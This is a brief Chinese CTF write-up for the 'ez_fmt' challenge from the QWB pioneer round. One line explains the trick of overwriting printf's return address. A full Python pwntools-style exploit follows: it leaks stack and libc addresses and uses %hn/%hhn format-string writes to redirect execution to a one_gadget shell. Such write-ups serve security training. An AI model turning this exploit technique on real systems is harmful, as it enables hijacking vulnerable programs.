# ez_fmt

> 强网先锋的水题：

在输入长度限制难以改其它返回地址时可以尝试改 printf 的返回地址：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("./libc-2.31.so")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

sf = strFmt()

ru(b"There is a gift for you 0x")
stack_base = int(ru(b"\n", drop=True), 16)
lg("stack_base", stack_base)

sf.current_n = 0
payload = b""
payload += sf.generate_hn_payload(0x28, elf.sym._start)
payload += b"%19$p"
print(len(payload))
print(payload)

payload = payload.ljust(0x28, b"\x00")
payload += p64(stack_base - 0x8)
s(payload)

ru(b"0x")
libc_base = int(ru(b"There is a gift for you 0x", drop=True), 16) - 0x24083
lg("libc_base", libc_base)
stack_base = int(ru(b"\n", drop=True), 16)
lg("stack_base", stack_base)

one_gadget = libc_base + 0xE3B01
lg("one_gadget", one_gadget)

sf.current_n = 0
payload = b""
payload += sf.generate_hn_payload(0x28, one_gadget)
sf.current_n = sf.current_n & 0xFF
payload += sf.generate_hhn_payload(0x20, one_gadget >> 16)
print(len(payload))
print(payload)

payload = payload.ljust(0x20, b"\x00")
payload += p64(stack_base + 0x68 + 2)
payload += p64(stack_base + 0x68)
s(payload)

ia()
```
